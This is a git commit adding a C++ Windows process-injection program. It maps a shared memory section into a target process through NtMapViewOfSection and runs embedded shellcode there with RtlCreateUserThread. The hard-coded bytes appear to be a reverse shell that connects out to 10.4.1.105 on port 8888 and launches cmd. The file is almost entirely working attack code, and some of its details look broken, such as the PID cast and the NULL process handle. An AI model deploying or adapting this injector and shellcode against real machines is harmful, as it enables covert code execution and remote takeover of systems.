56b82b758deea701c3c536c1a4fea6be21596774
lotrooz <147901792+lotrooz@users.noreply.github.com>
2024-03-11 17:00:29 +0900

    NtMapViewOfSection_Injection

---
+++ NtMapViewOfSetion_Injection.cpp
@@ -0,0 +1,132 @@
+#include <stdio.h>
+#include <Windows.h>
+#include <iostream>
+
+#pragma comment(lib, "ntdll")
+
+// Declare
+typedef struct _PUNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG           Length;
+    HANDLE          RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG           Attributes;
+    PVOID           SecurityDescriptor;
+    PVOID           SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+
+typedef NTSTATUS (NTAPI* NtCreateSection)(
+    OUT PHANDLE SectionHandle,
+    IN ACCESS_MASK DesiredAccess,
+    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
+    IN PLARGE_INTEGER MaximumSize OPTIONAL,
+    IN ULONG SectionPageProtection,
+    IN ULONG AllocationAttributes,
+    IN HANDLE FileHandle OPTIONAL
+);
+
+typedef NTSTATUS (NTAPI* NtMapViewOfSection)(
+    IN HANDLE SectionHandle,
+    IN HANDLE ProcessHandle,
+    IN OUT PVOID* BaseAddress,
+    IN ULONG_PTR ZeroBits,
+    IN SIZE_T CommitSize,
+    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
+    IN OUT SIZE_T ViewSize,
+    IN DWORD InheritDisposition,
+    IN ULONG AllocationType,
+    IN ULONG Win32Protect
+);
+
+typedef struct _PCLIENT_ID {
+    HANDLE UniqueProcess;
+    HANDLE UniqueThread;
+} CLIENT_ID, *PCLIENT_ID;
+
+typedef NTSTATUS(NTAPI* RtlCreateUserThread)(
+    IN HANDLE               ProcessHandle,
+    IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
+    IN BOOLEAN              CreateSuspended,
+    IN ULONG                StackZeroBits,
+    IN OUT PULONG           StackReserved,
+    IN OUT PULONG           StackCommit,
+    IN PVOID                StartAddress,
+    IN PVOID                StartParameter OPTIONAL,
+    OUT PHANDLE             ThreadHandle,
+    OUT PCLIENT_ID          ClientID
+);
+
+int main(int argc, char *argv[]) {
+    
+    if (argc != 2) {
+        printf("Check argv ! \n");
+        exit(0);
+    }
+
+    unsigned char buf[] =                                               // Shell Code
+        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+        "\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
+        "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
+        "\x00\x49\x89\xe5\x49\xbc\x02\x00\x22\xb8\x0a\x04\x01\x69"
+        "\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
+        "\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
+        "\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
+        "\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
+        "\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
+        "\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
+        "\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
+        "\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
+        "\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
+        "\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
+        "\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
+        "\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
+        "\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
+        "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
+        "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+        "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
+
+    NtCreateSection pNtCreateSection = (NtCreateSection)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection"));
+    NtMapViewOfSection pNtMapViewOfSection = (NtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtMapViewOfSection"));
+    RtlCreateUserThread pRtlCreateUserThread = (RtlCreateUserThread)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateUserThread"));
+
+    HANDLE section_handle;
+    LARGE_INTEGER section_size;
+    
+    pNtCreateSection(&section_handle, SECTION_ALL_ACCESS, NULL, &section_size, PAGE_READWRITE, SEC_COMMIT, NULL);
+
+    PVOID local_section_address = NULL;
+    SIZE_T view_size = 1024 * 1024;
+
+    pNtMapViewOfSection(section_handle, GetCurrentProcess(), &local_section_address, NULL, NULL, NULL, view_size, 2, NULL, PAGE_READWRITE);          // Local Section
+
+    HANDLE target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, false, (DWORD)argv[1]);
+    PVOID remote_section_address = NULL;
+
+    pNtMapViewOfSection(section_handle, target_process_handle, &remote_section_address, NULL, NULL, NULL, view_size, 2, NULL, PAGE_EXECUTE_READ);              // Remote Section
+
+    memcpy(local_section_address, buf, sizeof(buf));
+
+    HANDLE target_handle = NULL;
+
+    pRtlCreateUserThread(target_handle, NULL, FALSE, 0, 0, 0, remote_section_address, NULL, &target_handle, NULL);
+
+    return 0;
+}
